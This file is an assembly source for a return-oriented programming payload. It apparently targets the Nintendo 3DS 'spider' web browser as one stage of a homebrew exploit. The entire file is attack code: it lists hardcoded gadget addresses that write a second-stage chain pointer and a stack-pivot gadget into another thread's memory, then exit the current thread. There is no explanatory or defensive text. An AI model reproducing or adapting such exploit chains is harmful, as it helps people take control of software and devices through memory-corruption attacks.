.nds

.include "../../build/constants.s"

.create "spider_initial_rop.bin",0x0

.orga 0x0
	.word 0xDEADC0DE
.orga 0x4
	;actual ROP start
	; .word 0x0010322c ; inf loop

	;write thread0 initial rop
		.word 0x00101e34 ; pop	{r4, r5, r6, r7, r8, pc}
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE
			.word 0xDEADC0DE

		.word 0x00101ebc ; pop {r4, pc}
			.word 0x0FFFFF0C ; r4

		.word 0x0010c320 ; pop {r0, pc}
			.word 0x001303a4 ; r0 (pop {lr, pc})
		.word 0x00114868 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF10 ; r4

		.word 0x0010c320 ; pop {r0, pc}
			.word SPIDER_THREAD0ROP_VADR ; r0
		.word 0x00114868 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF14 ; r4

		.word 0x0010c320 ; pop {r0, pc}
			.word 0x001303a0 ; r0 (mov sp, lr | pop {lr, pc})
		.word 0x00114868 ; str r0, [r4] | pop {r4, pc}
			.word 0x0FFFFF0C ; r4

	.word 0x00123694 ; svcExitThread

.Close
